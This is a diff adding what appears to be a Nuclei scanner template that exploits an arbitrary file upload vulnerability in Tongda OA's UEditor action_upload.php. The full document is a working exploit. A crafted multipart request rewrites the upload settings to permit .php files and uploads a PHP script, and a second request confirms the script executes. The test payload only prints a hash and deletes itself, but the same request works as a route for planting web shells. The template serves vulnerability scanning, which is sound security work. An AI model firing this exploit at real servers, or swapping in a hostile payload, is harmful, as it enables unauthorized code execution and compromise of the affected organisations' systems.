@@ -1,0 +1,64 @@
+id: poc-tongda-oa-action-upload-anyfile
+info:
+  name: Tongda OA action_upload.php Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,critical
+  description: |
+    This template exploits an arbitrary file upload vulnerability in Tongda OA's action_upload.php that allows an attacker to upload malicious PHP files.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/module/ueditor/php/action_upload.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------55719851240137822763221368724"
+    body: |-
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+      ffff
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+      1000000000
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+      {{t1}}
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+      .php
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="ffff"; filename="{{t1}}.php"
+      Content-Type: application/octet-stream
+
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      -----------------------------55719851240137822763221368724
+      Content-Disposition: form-data; name="mufile"
+
+      submit
+      -----------------------------55719851240137822763221368724--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
